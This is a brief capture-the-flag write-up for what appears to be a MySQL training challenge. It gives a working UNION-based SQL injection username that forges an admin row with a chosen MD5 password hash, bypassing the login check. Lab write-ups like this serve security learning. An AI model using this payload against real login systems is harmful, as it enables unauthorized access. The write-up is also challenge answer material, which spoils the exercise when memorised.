look at the code, there's only 3 line changed comparing to Training: MySQL I. it takes out password from the result of the vul SQL statement and check if it's equal to user's input
so we trick the auth system, make the result of the SQL statement look like admin's password is `202cb962ac59075b964b07152d234b70` (`123`'s md5 hash).

according to the table structure given at the top of the code, we can do `SELECT 1,'admin','202cb962ac59075b964b07152d234b70';`

so the final username is `' UNION SELECT 1,'admin','202cb962ac59075b964b07152d234b70';#`, password is `123`.

answer: username: `' UNION SELECT 1,'admin','202cb962ac59075b964b07152d234b70';#`, password: `123`
